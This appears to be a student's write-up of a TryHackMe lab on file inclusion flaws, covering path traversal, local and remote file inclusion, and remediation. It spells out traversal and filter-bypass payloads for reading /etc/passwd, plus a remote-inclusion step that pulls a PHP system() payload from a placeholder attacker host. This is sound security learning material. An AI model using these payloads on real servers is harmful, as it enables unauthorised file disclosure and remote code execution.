# 🛡️ File Inclusion — TryHackMe (Summary)

This room introduces file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. It covers how these flaws occur, methods to bypass common input filters, and techniques to achieve Remote Code Execution (RCE).

---

## 🛠️ Inclusion Techniques & Bypasses

### 1. Path Traversal (Directory Traversal)
Web security vulnerability that allows an attacker to read arbitrary files on the server running an application.
- **Mechanism:** Uses the dot-dot-slash (`../`) sequence to move up directories and escape the web root folder.
- **Exploitation:** Target files like `/etc/passwd` on Linux or `../../../../windows/win.ini` on Windows via vulnerable parameters (e.g., `?file=../../../../etc/passwd`).

### 2. Basic LFI & Hardcoded Paths
Local File Inclusion occurs when the application dynamically includes local files without proper sanitization.
- **Direct Access:** If no directory prefix is enforced, files are included directly: `?file=/etc/passwd` (Lab 1).
- **Directory Prefixes:** If a folder is hardcoded in the backend (e.g., `include("includes/" . $_GET['file']);`), use relative paths to climb out: `?file=../../etc/passwd` (Lab 2).

### 3. Extension Bypasses (Null Byte & Current Directory)
When the application appends a fixed file extension (like `.php`) to the user input.
- **Null Byte (%00):** Terminates the string in older backend languages (PHP < 5.3.4), tricking the system into ignoring the trailing extension: `?file=../../../../etc/passwd%00` (Lab 3).
- **Current Directory Trick:** Appending `/.` or using specific folder patterns to confuse basic string termination filters (Lab 4).

### 4. Filter Evasion (Nested Sequences & Whitelists)
Bypassing naive input validation that attempts to strip out malicious keywords or patterns.
- **Nested Traversal:** If the app strips `../` in a single pass, nest the sequences so they collapse into a valid payload: `....//....//etc/passwd` (Lab 5).
- **Enforced Whitelists:** If the input must start with a specific folder, provide the required directory name first, then traverse out: `?file=THM-profile/../../../../etc/os-release` (Lab 6).

### 5. Remote File Inclusion (RFI) & RCE
Injecting an external URL into the application's include function to execute code hosted on an attacker-controlled server.
- **Prerequisites:** Requires `allow_url_fopen` and `allow_url_include` to be turned **On** in `php.ini`.
- **Exploitation:** Host a malicious payload (`<?php system("hostname"); ?>`) locally using `python3 -m http.server 9000`, then point the vulnerable app to it: `?file=http://<ATTACKER_IP>:9000/cmd.txt`.

---

## 🧠 Career Direction Insight

This module is foundational for understanding web application security, source code auditing, and initial access vectors.

- **Current Learning Focus:** Web Application Penetration Testing & Vulnerability Assessment
- **Target Role:** Application Security Engineer / Penetration Tester

---

## 📊 Key Takeaways & Challenge Tricks

- **Inspect Alternative Inputs:** Entry points aren't just limited to GET parameters. Always test **POST bodies, Cookies, and HTTP Headers** during challenges.
- **HTTP Method Tampering:** If a form uses GET, try changing the method attribute to `POST` via Browser Developer Tools (Inspector) to access different backend logic (Challenge 1).
- **Cookie Manipulation:** Session or tracking cookies (like replacing `guest` with a payload) are common LFI vectors (Challenge 2).
- **Remediation First:** Preventing these flaws requires disabling dangerous PHP configurations (`allow_url_include = Off`), implementing strict input whitelisting, and using functions like `basename()` to strip paths.

---

## 🧠 Final Summary

File inclusion vulnerabilities represent a severe breakdown in input validation. By manipulating parameters, an attacker can escalate from simple information disclosure (reading sensitive configuration files) to full Remote Code Execution (RCE) via RFI or log poisoning, completely compromising the underlying hosting environment.

---

**Task Status: ✔ Completed**